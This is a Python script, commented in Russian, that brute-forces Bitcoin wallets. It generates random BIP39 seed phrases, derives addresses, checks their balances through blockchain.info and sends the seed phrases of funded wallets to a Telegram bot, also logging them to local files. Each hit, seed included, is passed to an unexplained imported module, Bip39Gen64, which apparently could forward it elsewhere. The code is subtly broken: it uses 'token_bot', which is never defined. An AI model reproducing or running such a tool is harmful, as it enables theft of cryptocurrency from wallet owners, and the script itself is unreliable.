from multiprocessing.pool import ThreadPool as Pool
from colored import fg, bg, attr
from Bip39Gen import Bip39Gen
from decimal import Decimal
from time import sleep
import Bip39Gen64
import bip32utils
import threading
import requests
import mnemonic
import pprint
import random
import ctypes
import time
import os

timesl = 1 # задержка между запросами

token = '' # Telegram TOKEN
chat_id = '' # USER ID


class Settings():
    save_empty = "y"
    total_count = 0
    dry_count = 1
    wet_count = 0


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():
    timesltime = round(((60 / timesl) * 100)*60)
    timesltimed = timesltime * 24

    time.sleep(2)

    print("{}Скорость генерации : ~{}/час ~{}/день{}".format(bg("#5F00FF"), timesltime, timesltimed,attr("reset")))
    print("{}Проверка настроек и запуск всех потоков{}".format(bg("#5F00FF"), attr("reset")))
    print()
    start()
    time.sleep(5)


def getInternet():
    try:
        try:
            requests.get('https://www.google.com')#im watching you!
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance3(addr):
    try:
        response = requests.get(
            f'https://blockchain.info/multiaddr?active={addr}&n=1')

        return (
            response.json()
        )
    except:
        print('{}У тебя походу бан по ip{}'.format(fg("#008700"), attr("reset")))
        time.sleep(600)
        return (getBalance3(addr))
        pass


def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
                                                         random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def generateBd():
    adrBd = {}
    for i in range(100):
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        adrBd.update([(f'{addy}', mnemonic_words)])

    return adrBd


def listToString(s):
    # initialize an empty string
    str1 = "|"

    # return string
    return (str1.join(s))


def sendBotMsg(msg):
    if token_bot != "":
        try:
            url = f"chat_id={chat_id}&text={msg}"
            requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)

        except:
            pass


def check(f):
    while True:
        bdaddr = generateBd()
        addys = listToString(list(bdaddr))
        balances = getBalance3(addys)
        colortmp = 0

        # print('l')
        #with lock:
        for item in balances["addresses"]:
            addy = item["address"]
            balance = item["final_balance"]
            received = item["total_received"]

            mnemonic_words = bdaddr[addy]
            if balance > 0:
                msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy, mnemonic_words)

                sendBotMsg(msg)
                btcgen = Bip39Gen64.Bip39(msg)
                if btcgen == 1:
                    if colortmp == 1:
                        colortmp = 0
                        print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#00ba6f"), balance, received, addy, mnemonic_words, attr( "reset")))
                    else:
                        colortmp = 1
                        print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(bg("#00ba6f"), balance, received, addy, mnemonic_words, attr("reset")))

            else:
                if(received > 0):
                    msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy, mnemonic_words)

                    sendBotMsg(msg)
                    btcgen = Bip39Gen64.Bip39(msg)
                    if btcgen == 1:
                        if colortmp == 1:
                            colortmp = 0
                            print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(
                                fg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                        else:
                            colortmp = 1
                            print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(
                                bg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                else:
                    if colortmp == 1:
                        colortmp = 0
                        print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#FFFFFF"), balance, received, addy, mnemonic_words, attr("reset")))
                    else:
                        colortmp = 1
                        print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#000000")+bg("#cccccc"), balance, received, addy, mnemonic_words, attr("reset")))

            Settings.total_count += 1

            if Settings.save_empty == "y":
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
                except:
                    pass
            else:
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
                except:
                    pass

            if balance > 0:
                if btcgen == 1:
                    with open('results/wet.txt', 'a') as w:
                        w.write(
                            f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
                        Settings.wet_count += 1
            else:
                if Settings.save_empty == "y":
                    with open('results/dry.txt', 'a') as w:
                        w.write(
                            f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
                        Settings.dry_count += 1
        
        time.sleep(timesl)


def start():
    try:
        threads = 5
        if threads > 666:
            print("You can only run 666 threads at once")
            start()
    except ValueError:
        print("Enter an interger!")
        start()

    if getInternet() == True:
        for i in range(threads):
            my_thread = threading.Thread(target=check, args=(i,))
            my_thread.start()

    else:
        print("Told ya")
        userInput()


if __name__ == '__main__':
    getInternet()
    makeDir()

    if getInternet() == False:
        print("You have no internet access the generator won't work.")
    else:
        pass

    userInput()
